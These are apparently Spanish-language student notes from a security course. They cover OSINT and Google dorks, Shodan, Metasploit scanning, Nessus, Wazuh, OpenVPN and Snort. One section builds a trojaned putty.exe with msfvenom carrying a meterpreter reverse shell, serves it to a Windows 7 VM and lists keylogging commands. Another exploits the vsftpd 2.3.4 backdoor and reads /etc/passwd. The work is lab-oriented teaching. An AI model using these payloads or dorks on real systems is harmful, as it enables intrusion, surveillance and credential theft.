# Info
> [!NOTE] Nota
> `{domain-name}`: i.e: `duoc.cl`
> `{domain-name-full}`:i.e: `www.duoc.cl`

Sera en base a las 3 actividades que hemos hecho
1. [[#Busqueda de informacion en internet]]
2. [[#Evaluacion de Vulnerabilidades]] con Kali y Nessus
3. [[#Creacion de Malware]]
4. [[#Deteccion de Instrusos basados en HOSTS (Wazuh)]]
5. [[#Crear VPN]]
6. [[#Calculo de retorno]]

## Busqueda de informacion en internet

Sitios Web:
- [Lookup Icann](https://lookup.icann.org/en) | [Whois](https://www.whois.com/whois/) | [rfc1036/whois](https://github.com/rfc1036/whois) | [IANA Domains Root](https://www.iana.org/domains/root/db)
	- Buscar sitios como `duoc.cl`
- [Google](https://www.google.com/)
	- Permite hacer busquedas con parametros especiales "Google Dorking"
		- `filetype:xls inurl:”email.xls”`
		- `?intitle:index.of?mp3 queen`
		- `filetype:sql “MySQL dump” (pass|password|passwd|pwd)`
		- `site:gov filetype:doc allintitle:restricted`
		- `inurl:”ViewerFrame?Mode=”`
- [GHDB](https://github.com/readloud/Google-Hacking-Database) (Google Hacking DataBase): [Exploit-db](https://www.exploit-db.com/google-hacking-database) | [Maltergo (OS)](https://www.maltego.com/downloads/)
	- Ver archivos con contraseñas
	- Acceso a bases de datos
	- Sitios con wordpress vulnerables
- [Netcraft Tools](https://www.netcraft.com/tools/) | [Netcraft Site Report](https://sitereport.netcraft.com/)
	- Ver informacion asociada a los sitios, como Bloque Host, Compañia de Host, IPv4, AS BGP, IPv6, Delegacion de IPs entre otros
- [Shodan](https://www.shodan.io/)
	- Permite buscar sitios con vulnerabilidades, separarlos por paises y por puerto, entre otros
	- Ejemplos de busqueda (Separados con un espacio entre ellos)
		- `port:{port-number}`: Por Puerto
		- `country:{country-code}`: Por Pais
		- `{domain-name}`: Por Dominio Base
		- `Apache/{version}`: Por Version Apache
		- `title:"ISS Windows Server"`: Por Servidor de Windows
		- `/cgi-bin/guestimage.html`: Por camaras en vivo -> [insecam](http://insecam.org/)
- [Kali Linux (OS)](https://www.kali.org/)
	- Suite para Aprender sobre vulnerabilidades
		- Ejemplo de Uso
			- Levantar VM con Red NAT
			- `setxkbmap -layout latam`: Poner teclado español
			- `nc {domain-name} {port-number}`
			- `sudo nmap -sV -O -p 80 {domain-name}`
			- `nikto -h {domain-name}`
			- `whatweb -v {domain-name}`
			- `curl -v {domain-name}`
			- `wafw00f {domain-name}` - [EnableSecurity/wafw00f](https://github.com/EnableSecurity/wafw00f)
- [Metasploit-framework](https://github.com/rapid7/metasploit-framework) | [Docs](https://docs.metasploit.com)
	- Herramienta Open-Source para explotar vulnerabilidades
		- Ejemplo de uso
			- `msfconsole`: Abrir la consola
			- `use auxiliary/scanner/http/http_version`: Cargar modulo auxiliar
			- `show options`: Ver opciones disponibles y parametros configurados
			- `set rhosts {domain-name-full}`: Configurar Host
			- `run`: Ejecutar el modo configurado
		- [Database Workspace Attack](https://www.offsec.com/metasploit-unleashed/using-databases/)
			- `service postgresql start`: Iniciar base de datos
			- `msfdb init`: Iniciar una base de datos
			- `msfconsole -q`: Conectar msf a la base de datos
			- `workspace -a company`: Crear un espacio de trabajo
			- `db_nmap {ip-kali}`: Revisa puertos abiertos
			- `services`: Lista de servicios disponibles
			- `db_nmap {ip-kali} -sV`: Revisa puertos abiertos en detalle
			- `services`: Guarda mas informacion de los servicios
			- `db_nmap {ip-externo} -sV`
			- `hosts`: Listar servidores atacados
			- `services -p {port}`: Listar uso puerto de los hosts
			- `use auxiliary/scanner/smb/smb_version`
			- `show options`: Ver opcion y parametros
			- `set rhosts {ip-kali}`: Marcar victima
			- `show options`: Informacion extraida de hosts para el ataque
			- `run`: Ejecutar ataque
			- `services -p 445`: Actualizacion informacion de samba

## Evaluacion de Vulnerabilidades
> [!IMPORTANT] Importante
> Esta instalacion toma 1 hora en compilarse, cuidado con el tiempo

> [!WARNING] Peligro
> Puedes conseguir la licencia OFFLINE con la ayuda de la pagina de [nessus](https://plugins.nessus.org/v2/offline.php) y esta [guia](https://community.tenable.com/s/article/How-to-configure-a-new-install-of-Nessus-from-the-command-line) la cual usa `nessuscli` el cual esta en el directorio `/opt/nessus/sbin/`, no recomiendo este metodo.

> [!IMPORTANT] Importante
> Kali debes configurarlo con la maxima configuracion de CPU, RAM y Storage (SSD + I/O Anfitrion), ademas de habilitar ambos tick de paravirtualizacion ([Guia Aqui](https://stackoverflow.com/questions/54251855/virtualbox-enable-nested-vtx-amd-v-greyed-out)), de esta forma la compilacion se demorara menos.

Iniciar Maquina [Kali](https://www.kali.org/) Actualizada (2024.3)

- `sudo su`: Ser root
- `setxkbmap -layout latam`
- `apt-get update && apt-get upgrade`
- Descargar [Nessus](https://www.tenable.com/downloads/nessus) (10.8.3) para "Linux - Ubuntu - AMD64" o con el link en curl desde el VM
```
curl --request GET --url 'https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-10.8.3-ubuntu1604_amd64.deb' --output 'Nessus-10.8.3-ubuntu1604_amd64.deb'
```
- Consigue una licencia gratuita por iniciar sesion para [Nessus Essentials](https://www.tenable.com/products/nessus/nessus-essentials) , necesitas tu correo institucional debido a que es dirigido a la [educacion](https://www.tenable.com/tenable-for-education)
- `dpkg -i {nessus.deb}`: Instala nessus
- `systemctl enable --now nessusd`: Inicia Nessus, incluyendo despues de reiniciar la maquina
- conectarse a la ip `https://kali:8384` para ver la interfaz de nessus
- Simplemente selecciona siguiente sin marcar ninguna opcion
- Cuando salga el menu de opciones, marca "`Nessus Essentials`"
- Pon un "Nombre" y "Apellido", y el correo puedes omitirlo, debido a que posiblemente envie un error, dar en "`skip`"
- Luego pon tu clave de activacion ONLINE, que te llego al correo al iniciar sesion en Nessus
- Crea un usuario `admin` o `kali` con alguna contraseña segura y presiona en "Submit"
- Se empezara a compilar los plugins, es el paso final de la instalacion, se demora aproximadamente 45 minutos en completar con las optimizaciones
- Luego que se compilen los plugins, se instalar, esto toma 5 minutos, saldra un mensaje de "Finalizo la instalacion de plugins" y podras analizar 16 IPs
- Analiza la IP de Kali y anota alguna algunas de sus vulnerabilidades usando [CVE](https://www.cve.org/), [CVSS](https://www.cvedetails.com/) o [EPSS](https://www.first.org/epss/)

**Usar [zaproxy](https://www.kali.org/tools/zaproxy/) via Kali**
- Inicia Kali en modo adaptador de red "Red NAT"
- Iniciar `owasp-zap` desde el menu kali
- selecciona la primera opcion la primera vez que lo abras "`Yes, i want to persist this session with name based on the current timestamp`"
- Ingresa la siguiente IP modificando {ip-metasploitable} por la ip de metasploit
- `http://{ip-metasploitable}/multillidae/index.php?page=user-info.php`
- Una vez finalize el analisis, te dara un reporte de las vulnerabilidades reportadas

## Creacion de Malware
Maquinas
- [Kali](https://www.kali.org/)
- Win 7

Herramientas
- [Putty](https://tartarus.org/~simon/putty-snapshots/w32/): Link a la version x86 32 Bits, debes descargar `putty.exe`
	- Descarga con Curl: `wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe`
- Ayuda
	- [Offsec Blog- Backdooring Exe Files](https://www.offsec.com/metasploit-unleashed/backdooring-exe-files/) 
	- [Metasploit Docs - How to use a Reverse Shell](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html)
	- [Medium Blog - Create Reverse Shell](https://medium.com/@jbtechmaven/ethical-hacking-reverse-shell-attack-using-metasploit-57e9cd400c88)

Pasos
> [!NOTE] Nota
> lhost or listener port: {ip-kali}
> lport or listener port: {port-kali-free} or 4444

- Recuerda modificar los parametros {ip-kali} por la ip de tu maquina
```
msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost={ip-kali} lport=4444 -e x86/shikata_ga_nai -i 10 -b "\x00" -f exe -o putty32virus.exe
```
- Abre una consola extra y ejecuta `msfconsole`
- `use exploit/multi/handler`
- `set PAYLOAD windows/meterpreter/reverse_tcp`
- `set LHOST {ip-kali}`
- `set LPORT 4444`
- `exploit`
- Vuelve a tu consola principal
- Instala servidor apache con `apt-get install apache2`
- Activa servidor con `systemctl start apache2`
- Mueve el archivo `putty32virus.exe` a `/var/www/html`
- Si no funciona elimina el archivo `/var/www/html/index.html`
- Abre tu maquina Win 7
- Abre la IP de Kali en el navegador
- Descarga y ejecuta el archivo, de esta forma ya puedes usar tu consola de kali con `msfconsole` para controlar la maquina, te dejo algunas ideas
	- `keyscan_start` -> (escribe informacion en windows) -> `keyscan_dump` -> `keyscan_stop`
	- `shell` -> `starte explorer.exe` -> `exit` -> `keyboard_send google.com` -> `keyevent 13` (debes encontrar el evento a la key de enter) -> `shell` -> `TASKKILL /F /IM explorer.exe`

## Deteccion de Instrusos basados en HOSTS (Wazuh)
Maquinas Usadas
- [Kali](https://www.kali.org/)
- Windows 7
Sitios usados
- [OSSEC](https://www.ossec.net/)
- [Wazuh](https://wazuh.com/) 
	- Linux
		- [Quickstart all-in-one](https://documentation.wazuh.com/current/quickstart.html)
		- [Agente](https://documentation.wazuh.com/current/installation-guide/wazuh-agent/wazuh-agent-package-linux.html) (Opcional)
	- Windows
		- [Agente](https://documentation.wazuh.com/current/installation-guide/wazuh-agent/wazuh-agent-package-windows.html)

Instalacion Rapida Kali Linux
- Inicia Kali con red Puente
- Anota la ip de la maquina Kali con `ip -br a`, sera `{ip-kali}`

Script automatico | [Quickstart](https://documentation.wazuh.com/current/quickstart.html)
- `curl -sO https://packages.wazuh.com/4.9/wazuh-install.sh && sudo bash ./wazuh-install.sh -a`
Cuando termine, lanzara un mensaje
```
INFO: --- Summary ---
INFO: You can access the web interface https://<wazuh-dashboard-ip>
    User: admin
    Password: <ADMIN_PASSWORD>
INFO: Installation finished.
```
- Accedes a travez de un navegador con `https://<wazuh-dashboard-ip>`

Instalacion Agente Linux
- `curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import && chmod 644 /usr/share/keyrings/wazuh.gpg`
- `echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | tee -a /etc/apt/sources.list.d/wazuh.list`
- `apt-get update`
- `WAZUH_MANAGER="{ip-kali}" apt-get install wazuh-agent` recuerda cambiar {ip-kali}
- `systemctl daemon-reload`
- `systemctl enable --now wazuh-agent`
- `sed -i "s/^deb/#deb/" /etc/apt/sources.list.d/wazuh.list`
- `apt-get update`

Instalacion Agente Windows 7
- Descarga el instalador MSI de la [GUIA](https://documentation.wazuh.com/current/installation-guide/wazuh-agent/wazuh-agent-package-windows.html) oficial
- Abre una ventana CMD en modo administrador
- `wazuh-agent-4.9.2-1.msi /q WAZUH_MANAGER="{ip-kali}"`
- `NET START Wazuh`

## Crear VPN
> [!NOTE] Nota
> Para mayor simplicidad, solo usare llaves Estaticas compartidas, en vez de crear una PKI con EasyRSA

Maquinas Usadas en Red NAT
- Win 7
- [Kali](https://www.kali.org/)

Paginas Usadas
- OpenVPN | [Sitio Oficial](https://openvpn.net/community-resources/) y [Documentacion](https://openvpn.net/community-resources/)

Kali Linux
- `apt-get install openvpn`
- `openvpn --genkey --secret static.key`
- `sudo cp static.key /etc/openvpn/`
- Modifica el archivo con `sudo micro /etc/openvpn/server.conf`
```
dev tun
ifconfig 172.16.0.1 172.16.0.2
secret /etc/openvpn/static.key
port 1194
proto udp
keepalive 10 120
persist-key
persist-tun
verb 3
```
- Inicia el servidor con `sudo systemctl start openvpn@server`

Windows 7
- Instalar [OpenVPN Community](https://openvpn.net/community-downloads/) y ejecutarlo
- Envia los archivos `static.key` y dejalo en la carpeta `C:\Program Files\OpenVPN\config`
- Crea un archivo llamado `client.ovpn` en la carpeta `C:\Program Files\OpenVPN\config` que contenga lo siguiente, recuerda modificar {ip-kali}
```
remote {ip-kali} 1194
dev tun
ifconfig 172.16.0.2 172.16.0.1
secret static.key
proto udp
nobind
persist-key
persist-tun
verb 3
```
- Ejecuta `OpenVPN GUI` como administrador
- Haz click en "Conectar"

Probar conectividad
Windows 7
- `ping 172.16.0.1`
Kali
- `ping 172.16.0.2`

## Explotacion de Vulnerabilides
Maquinas a usar en modo Red NAT
- [Kali](https://www.kali.org/)
- [Metasploitable2](https://www.rapid7.com/products/metasploit/metasploitable/) | [Guia de instalacion]()

Ayuda
- NMAP
	- [vulnersCom/namp-vulners NSE nmap repo](https://github.com/vulnersCom/nmap-vulners)
	- [esecurityplanet - Nmap Vulnerability made easy](https://www.esecurityplanet.com/networks/nmap-vulnerability-scanning-made-easy/)
	- [Nmap Docs - NSE Usage](https://nmap.org/book/nse-usage.html)
- vsFTP
	- [Medium Blog - Exploiting vsFTP](https://medium.com/@josegpach/exploiting-ftp-vulnerabilities-on-metasploitable-2-bbd935d42e23)

**Kali Linux**
Escaneo de puertos
- `ping {ip-metasploitable}`
- `nmap --script-updatedb`
- `nmap -sV --script vuln {ip-metasploitable}`
Atacar Puerto 21
- `nmap -sS -sV -O {ip-metasploitable}`: Ver que version esta ejecutando en el puerto 21
- `msfconsole`
- `search vsftpd 2.3.4`: Buscar exploit para esa version de vsftpd
- `use exploit/unix/ftp/vsftpd_234_backdoor`
- `show options`
- `set RHOSTS {ip-metasploitable}`
- `exploit`
Verificar Ataque
- `ipconfig`
- `whoami`
- `ls`
- `cat /etc/passwd`

## Sistema de deteccion de instrusos
Maquinas a usar en modo Red NAT
- [Kali](https://www.kali.org/)
- [Metasploitable](https://www.rapid7.com/products/metasploit/metasploitable/) | [Guia de instalacion](https://github.com/z0s3r77/Metasplotable_2)

Paginas Apoyo
- Leer Nota [[999 - Archivado/IPtables|IPtables]]
- [Kali - Tools/snort](https://www.kali.org/tools/snort/)
- [Guia Snort en kali](https://laboratoriolinux.es/index.php/-noticias-mundo-linux-/software/35752-como-usar-snort-en-kali-linux-guia-paso-a-paso.html)

**Kali Linux**
Borrar todas las reglas de iptables
- `iptables -F`
- `iptables -t NAT -F`
- `iptables -t filter -F`
- `iptables -t mangle -F`
- `iptables -X`
- `iptables -L`

Definir reglas por defecto en ACCEPT
- `iptables -P input ACCEPT`
- `iptables -P output ACCEPT`
- `iptables -P forward ACCEPT`
- `iptables -P prerouting ACCEPT`
- `iptables -P postrouting ACCEPT`

Realizar Apt Update / NO UPGRADE
- `apt-get update`

Instalar SNORT
- `apt-get install snort -y`
- `snort -v`

Inicia en modo de prueba
> Para revisar el estado del archivo de configuracion
`sudo snort -T -c /etc/snort/snort.conf`


Iniciar snort en la interfaz
> Cambia `[interface]` por la interfaz que quiere ser analizada
- `sudo snort -A console -q -i [interface] -c /usr/local/etc/snort/snort.conf`


**Metasploitable**
> Nota: Luego de iniciar snort en Kali

Ping a maquina Kali
- `ping [ip-kali]`


**Kali**
Revisa los logs de snort
- `grep "ALERT" /var/log/snort/alert | less`
Crea regla para alertar sobre pings (ICMP) desde metasploitable
- `iptables -A INPUT -p icmp --icmp-type echo-request -j LOG --log-prefix "ICMP Detectado: "`
Crea regla para alertar sobre accesos SSH desde metasploitable
- `iptables -A INPUT -p tcp --dport 22 -m state --state NEW -j LOG --log-prefix "SSH Detectado: "`
Crea regla para alertar sobre accessos HTTP desde metasploitable
- `iptables -A INPUT -p tcp --dport 80 -m state --state NEW -j LOG --log-prefix "HTTP Detectado: "`
- `iptables -A INPUT -p tcp --dport 443 -m state --state NEW -j LOG --log-prefix "HTTPS Detectado: "`
Visualizar logs
- `tail -f /var/log/syslog`

**Metasploitable**
Envia ping
- `ping {ip-kali}`
Accede SSH
- `ssh kali@{ip-kali}`
Accede a la pagina web (Kali debe tener un servidor web habilitado)
- `curl -v http://{ip-kali}`
- `curl -v https://{ip-kali}`

## Calculo de retorno
Comming Soon ^^











# Deprecated (Ignorar)
## Instalacion completa de Wazuh
Para efectos practicos, el uso es ligero y rapido, no hay que montar un servidor completo sino usarlo, por lo que esta instalacion es demaciado complicada.

- |  | [Crear Certificados Linux](https://documentation.wazuh.com/current/user-manual/wazuh-dashboard/certificates.html) | [Guia Agente Linux](https://documentation.wazuh.com/current/installation-guide/wazuh-agent/wazuh-agent-package-linux.html) | [Guia Agente Windows](https://documentation.wazuh.com/current/installation-guide/wazuh-agent/wazuh-agent-package-windows.html)

Pasos instalacion Kali WAZUH
- Inicia Kali con red Puente
- Anota la ip de la maquina Kali con `ip -br a`, sera {ip-kali}

Instalacion Dashboard Linux | [Guia Paso a Paso](https://documentation.wazuh.com/current/installation-guide/wazuh-dashboard/step-by-step.html)
- Instala las dependencias
```
apt-get install debhelper tar curl libcap2-bin gnupg apt-transport-https debconf adduser procps filebeat micro
```
- Instala las llaves publicas del repositorio
```
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import && chmod 644 /usr/share/keyrings/wazuh.gpg
```
- Activa el repositorio
```
echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" | tee -a /etc/apt/sources.list.d/wazuh.list
```
- `apt-get update`
- `apt-get -y install wazuh-dashboard`
- Edita el archivo `/etc/wazuh-dashboard/opensearch_dashboards.yml`
    - Modifica la entrada `server.host` con {ip-kali}
    - Modifica la entrada `opensearch.hosts` con las fuentes separadas por comas `["https://{ip-kali}:9200"]`
    - Modifica la entrada `name` al nombre, sera usado con `$NODE_NAME`
- `wget https://packages.wazuh.com/4.9/config.yml`
- `wget https://packages.wazuh.com/4.9/wazuh-certs-tool.sh`
- Edita el archivo `config.yml` con los siguientes
    - node → ip: {ip-kali}
    - server → ip: {ip-kali}
    - dashboard → ip: {ip-kali}
    - NOTA: Puedes borrar las demas entradas comentadas o dejarlas asi
- ejecuta el script `bash wazuh-certs-tools-sh -A`
- Crea la carpeta `mkdir /etc/wazuh-dashboard/certs`
- Comprime los certificados `tar -cvf ./wazuh-certificates.tar -C ./wazuh-certificates/ .`
- Elimina la carpeta `rm -rf ./wazuh-certificates`
- Descomprime los certificados en todos los nodos
	- si configuraste el nombre en config.yaml como: `name=node-1` -> ejecuta en la terminal `NODE_NAME=node-1`
	- Asi con cada nodo hasta que hayas configurado todos los que esten en config.yml, ejemplo: `name=Fernando` -> ejecuta `NODE_NAME=Fernando`
- Repite el paso anterior luego de ejecutar la siguiente secuencia por cada nodo
	- `tar -xf ./wazuh-certificates.tar -C /etc/wazuh-dashboard/certs/ ./$NODE_NAME.pem ./$NODE_NAME-key.pem ./root-ca.pem`
	- `mv -n /etc/wazuh-dashboard/certs/$NODE_NAME.pem /etc/wazuh-dashboard/certs/dashboard.pem`
	- `mv -n /etc/wazuh-dashboard/certs/$NODE_NAME-key.pem /etc/wazuh-dashboard/certs/dashboard-key.pem`
	- `chmod 500 /etc/wazuh-dashboard/certs`
	- `chmod 400 /etc/wazuh-dashboard/certs/*`
	- `chown -R wazuh-dashboard:wazuh-dashboard /etc/wazuh-dashboard/certs`
- Recarga las configuraciones con `systemctl daemon-reload`
- `systemctl enable --now wazuh-dashboard`
- Edita `/usr/share/wazuh-dashboard/data/wazuh/config/wazuh.yml` en la seccion "url", configurando 
	- `url: https://{ip-kali}`
- Acceder desde Firefox a `https://{ip-kali}` o `https://{ip-kali}:55000`, con las siguientes credenciales
	- `username: admin`
	- `password: admin`
